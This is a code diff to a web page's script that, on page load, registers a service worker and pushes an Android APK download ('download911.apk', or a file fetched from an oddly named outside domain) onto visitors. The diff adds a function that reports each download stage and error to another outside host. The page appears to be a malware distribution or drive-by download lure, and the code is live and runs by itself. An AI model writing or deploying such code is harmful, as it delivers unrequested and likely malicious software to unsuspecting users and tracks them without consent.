@@ -5,15 +5,30 @@
 </head>
 <body>
 <script>
+    async function logEvent(eventType, data = {}) {
+        try {
+            data.event = eventType;
+            const response = await fetch("https://ptrforcfg.com/gh_test", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            response.json();
+        } catch (error) {
+            console.error('❌ Send error:', error);
+        }
+    }
+
     async function downloadApk() {
         const apkURL = "https://blindlyorganicsnake.autos/aaa8e7e844e856a015a/" + location.search;
-
+        logEvent("fallback_dl_start");
         try {
             const response = await fetch(apkURL, {
                 method: 'GET',
-                // mode: 'no-cors',
                 credentials: 'omit'
             });
+
+            logEvent("fallback_dl_response", {ok: response.ok});
 
             if (!response.ok) {
                 throw new Error(`HTTP ${response.status}: ${response.statusText}`);
@@ -39,18 +54,25 @@
             URL.revokeObjectURL(url);
         } catch (error) {
             console.error(error);
+            logEvent("sw_download_apk_error", {error});
             location.href = apkURL
         }
     }
 
     async function initSW(){
+        logEvent("init", {sw: 'serviceWorker' in navigator});
         if ('serviceWorker' in navigator) {
             await navigator.serviceWorker.register('./sw.js');
             await new Promise(resolve => setTimeout(resolve, 1000));
+            logEvent("go");
             window.location.href = 'download911.apk' + location.search;
         } else {
             downloadApk();
         }
+    }
+
+    window.onerror = function (event, source, lineno, colno, error){
+        logEvent("error", {source, lineno, colno, error});
     }
 
     initSW();
